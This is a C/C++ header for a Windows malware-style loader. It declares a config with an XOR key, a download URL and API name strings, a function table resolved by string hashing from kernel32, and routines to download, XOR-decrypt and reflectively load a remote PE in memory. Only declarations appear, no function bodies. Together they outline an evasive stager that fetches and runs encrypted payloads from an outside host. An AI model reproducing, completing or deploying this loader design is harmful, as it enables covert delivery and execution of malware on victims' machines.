#ifndef _LOADER_H
#define _LOADER_H

#include <Windows.h>
#include "winapi.h"

typedef struct _LOADER_CONFIG
{
	DWORD dwMagic;
	DWORD dwXorKey;
	CHAR strUrl[150];
	CHAR strKernel32[9];
	CHAR strNtDll[6];
	CHAR strWinInet[8];

	CHAR strVirtualAlloc[13];
	CHAR strVirtualProtect[15];

	CHAR strCreateFileA[12];
	CHAR strWriteFile[10];
	CHAR strCloseHandle[12];

	CHAR strInternetOpenA[14];
	CHAR strInternetOpenUrlA[17];
	CHAR strHttpQueryInfoW[15];
	CHAR strInternetReadFileExA[20];
	CHAR strWtoi[6];
	CHAR strExitProcess[12];

	CHAR strUserAgent[187];
} LOADER_CONFIG, *PLOADER_CONFIG;


typedef struct _VTABLE
{
	PLOADER_CONFIG lpLoaderConfig;

	GETPROCADDRESS GetProcAddress;
	LOADLIBRARYA LoadLibraryA;
	VIRTUALALLOC VirtualAlloc;
	VIRTUALPROTECT VirtualProtect;
	CREATEFILEA CreateFileA;
	WRITEFILE WriteFile;
	CLOSEHANDLE CloseHandle;
	INTERNETOPENA InternetOpenA;
	INTERNETOPENURLA InternetOpenUrlA;
	INTERNETREADFILEEXA InternetReadFileExA;
	HTTPQUERYINFOW HttpQueryInfoW;
	WTOI wtoi;
	EXITPROCESS ExitProcess;
} VTABLE, *PVTABLE;

#define CALC_OFFSET(type, ptr, offset) (type) (((ULONG64) ptr) + offset)
#define CALC_OFFSET_DISP(type, base, offset, disp) (type)((DWORD)(base) + (DWORD)(offset) + disp)
#define CALC_DISP(type, offset, ptr) (type) (((ULONG64) offset) - (ULONG64) ptr)

typedef struct base_relocation_block
{
	DWORD PageRVA;
	DWORD BlockSize;
} base_relocation_block_t;

typedef struct base_relocation_entry
{
	WORD offset : 12;
	WORD type : 4;
} base_relocation_entry_t;

typedef int (WINAPI *CRTMAIN)(DWORD);
typedef int (WINAPI *EXPORT)();

extern "C" VOID Startup();
extern "C" VOID Loader(__in PLOADER_CONFIG lpLoaderConfig);
extern "C" BOOL LoadVTable(__out PVTABLE lpTable);
extern "C" BOOL GetPointers(__out PGETPROCADDRESS fpGetProcAddress, __out PLOADLIBRARYA fpLoadLibraryA, __out PHANDLE pKernel32);
extern "C" HANDLE GetKernel32Handle();
extern "C" DWORD GetStringHash(__in LPVOID lpBuffer, __in BOOL bUnicode, __in UINT uLen);
extern "C" LPBYTE DownloadAndDecrypt(__in PVTABLE lpTable, __in LPSTR strUserAgent, __in LPSTR strUrl, __in LPDWORD dwFileLen, __in DWORD dwXorKey, BOOL bXored);
extern "C" BOOL DownloadFile(__in PVTABLE lpTable, __in HINTERNET hUrl, __in LPBYTE lpBuffer, __in DWORD dwBufferLen);
extern "C" LPBYTE Decrypt(__in LPBYTE lpBuffer, __in DWORD dwBuffLen, __in DWORD dwXorKey);
extern "C" LPVOID _LoadLibrary(__in PVTABLE lpTable, __in LPVOID lpRawBuffer, __out LPVOID *lpExport);

// CRT
extern "C" LPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);
extern "C" VOID __MEMSET__(__in LPVOID p, __in CHAR cValue, __in DWORD dwSize);


#endif